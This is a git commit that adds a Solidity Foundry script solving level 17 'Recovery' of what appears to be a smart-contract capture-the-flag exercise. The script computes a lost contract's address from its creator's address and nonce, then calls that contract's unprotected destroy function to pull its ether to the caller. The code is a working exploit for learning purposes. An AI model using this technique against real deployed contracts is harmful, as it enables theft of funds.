a116f7a130c4b54d56fc41b4239e33d14a7e01e8
Tudor Anastasiu <tg.anastasiu@gmail.com>
2024-01-15 11:31:52 +0200

    feat: add level 17 - Recovery

---
+++ script/17_Recovery.s.sol
@@ -0,0 +1,18 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.23;
+
+import "forge-std/Script.sol";
+import "../src/interfaces/17_IRecovery.sol";
+
+address constant INSTANCE = 0x0758a33EA253d983D523Aa93889815d85546785f;
+
+contract RecoveryPOCScript is Script {
+    function run() external {
+        vm.startBroadcast();
+
+        address lostcontract = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(INSTANCE), bytes1(0x01))))));
+        ISimpleToken(lostcontract).destroy(payable(msg.sender));
+
+        vm.stopBroadcast();
+    }
+}
